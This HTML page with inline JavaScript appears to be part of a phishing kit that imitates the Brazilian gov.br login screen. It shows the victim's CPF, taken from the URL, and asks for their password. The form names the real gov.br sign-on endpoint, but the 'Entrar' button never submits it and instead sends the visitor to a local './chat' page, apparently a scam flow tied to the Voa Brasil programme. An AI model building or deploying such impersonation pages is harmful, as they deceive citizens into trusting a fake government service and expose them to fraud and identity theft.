 <main>
    <form method="post" id="loginData" action="https://sso.acesso.gov.br/login?client_id=voabrasil.sistema.gov.br&amp;authorization_id=190eb074bd8" novalidate="" autocomplete="off">
        <div class="card" id="login-password">
            <h3>Digite sua senha</h3>
            <label>CPF</label>
            <h4 id="cpf-value">$cpf</h4>
            <label for="password">Senha</label>

            <div class="password-eye">
                <input tabindex="1" name="password" id="password" type="password" placeholder="Digite sua senha atual" autocomplete="new-password">
                <span tabindex="2" toggle="#password" class="fa fa-fw fa-eye toggle-password"></span>
            </div>

            <button id="password-recovery" type="submit" name="operation" value="call-account-recovery" class="button-href-mimic" tabindex="2">Esqueci minha senha</button>
            <center>
                <div class="button-panel">
                    <button id="submit-button" type="button" class="button-ok" aria-label="Botão Entrar. Aperte a tecla enter para entrar." tabindex="3" onclick="redirectToChat()">Entrar</button>
                </div>
            </center>
        </div>
        <div class="card" id="faq">
            <a tabindex="10" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" target="_blank">Ficou com dúvidas?</a>
        </div>
    </form>
</main>
<div>
    <div class="painel-login-container"></div>
</div>
<footer></footer>

<script>
    function getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split("&");
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if (pair[0] === variable) {
                return pair[1];
            }
        }
        return false;
    }

    function redirectToChat() {
        var cpf = getQueryVariable("cpf");
        if (cpf) {
            var cpfField = document.createElement("input");
            cpfField.setAttribute("type", "hidden");
            cpfField.setAttribute("name", "cpf");
            cpfField.setAttribute("value", cpf);
            document.getElementById("loginData").appendChild(cpfField);
            window.location.href = './chat/index.html?cpf=' + cpf;
        } else {
            alert("CPF não encontrado na URL");
        }
    }

    document.addEventListener("DOMContentLoaded", function() {
        var cpf = getQueryVariable("cpf");
        if (cpf) {
            document.getElementById("cpf-value").textContent = cpf;
        } else {
            alert("CPF não encontrado na URL");
        }
    });
</script>
